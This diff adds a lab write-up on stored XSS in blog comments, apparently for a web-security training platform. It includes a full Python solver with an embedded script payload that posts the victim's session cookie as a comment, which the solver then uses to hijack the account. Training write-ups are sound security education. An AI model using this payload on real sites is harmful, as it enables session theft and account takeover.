@@ -1,0 +1,138 @@
+---
+title: 'XSS Lab 22'
+description: 'Stored XSS in blog comments used to force victims to post their session cookie via CSRF-like behavior'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Exploiting cross-site scripting to steal cookies
+
+<div style="text-align: justify;">
+  This lab contains a stored cross-site scripting (XSS) vulnerability in the blog comments function. The exploit shown here leverages the XSS to make a victim browser automatically submit a new comment on the victim's behalf containing their own session cookie — effectively turning the XSS into a CSRF that publishes the cookie to the site's comments (an alternative to using an external exfiltration server like Burp Collaborator). After the cookie is posted in a comment, the attacker can retrieve it and reuse the `session` cookie to impersonate the victim (for example, by visiting `/my-account` with the stolen cookie).
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The blog comment field is stored and later rendered to visitors (stored XSS).
+- Inject JavaScript as a comment that, when executed by a victim, reads the victim's CSRF token from the current page and then submits a comment containing `document.cookie`.
+- The comment submission endpoint (`/post/comment`) accepts the normal CSRF-backed comment POST; because the victim's browser is authenticated, the comment is posted under the victim session.
+- The attacker (or an automated script) can then fetch the post page and extract the cookie value published in the comment body.
+- Use the published `session` cookie value in subsequent requests (or replace your own session cookie) to load `/my-account` and impersonate the victim.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import re
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def check_burp():
+    try:
+        requests.get("http://127.0.0.1:8080", proxies=proxies, timeout=3, verify=False)
+    except Exception:
+        print("[-] Burp Suite not running.")
+        sys.exit(1)
+
+def exploit_xss(url, payload):
+    s = requests.Session()
+    s.proxies = proxies
+    s.verify = False
+
+    post_page = url.rstrip("/") + "/post?postId=4"   # changed to 4
+    # fetch page to get csrf
+    r = s.get(post_page)
+    r.raise_for_status()
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf_input = soup.find("input", {"name": "csrf"})
+    if not csrf_input:
+        print("[-] CSRF token not found")
+        return False
+    csrf = csrf_input["value"]
+
+    data = {
+        "csrf": csrf,
+        "postId": "4",   # changed to 4
+        "comment": payload,
+        "name": "test",
+        "email": "test@test.com",
+        "website": "http://test.com"
+    }
+    # submit the comment (XSS payload)
+    s.post(url.rstrip("/") + "/post/comment", data=data)
+
+    # fetch the post page again using same session (so we capture any rendered comment)
+    resp = s.get(post_page)
+    resp.raise_for_status()
+
+    # extract session token from page content into variable
+    match = re.search(r'session=([A-Za-z0-9]+)', resp.text)
+    session_token = match.group(1) if match else None
+
+    print("session_token =", session_token)
+
+    # --- send the final request with Cookie: session={session_token} ---
+    if session_token:
+        headers = {'Cookie': f'session={session_token}'}
+        final_resp = s.get(url.rstrip("/") + "/my-account", headers=headers)
+        final_resp_text = final_resp.text
+    else:
+        print("[-] No session token extracted, sending normal request instead")
+        final_resp = s.get(url.rstrip("/") + "/")
+        final_resp_text = final_resp.text
+
+    # check if lab solved (adjust check-string if different)
+
+    session = requests.Session()
+    res = session.get(url, verify=False, proxies=proxies)
+    if "Congratulations" in res.text:
+        print("[+] Lab solved 🎉")
+        return True
+    else:
+        print("[-] Lab not solved (no success string found).")
+        return False
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        sys.exit(1)
+    url = sys.argv[1].rstrip("/")
+    check_burp()
+    print("[*] Attempting XSS on postId=4...")
+    payload = """
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+  var token = document.getElementsByName('csrf')[0].value;
+  var data = new FormData();
+  data.append('csrf', token);
+  data.append('postId', 4);
+  data.append('comment', document.cookie);
+  data.append('name', 'victim');
+  data.append('email', 'test@test.com');
+  data.append('website', 'http://test.com');
+  fetch('/post/comment', { method: 'POST', mode: 'no-cors', body: data });
+});
+</script>
+    """
+    if exploit_xss(url, payload):
+        print("[+] XSS successful!")
+    else:
+        print("[-] XSS unsuccessful.")
+
+if __name__ == "__main__":
+    main()
+```
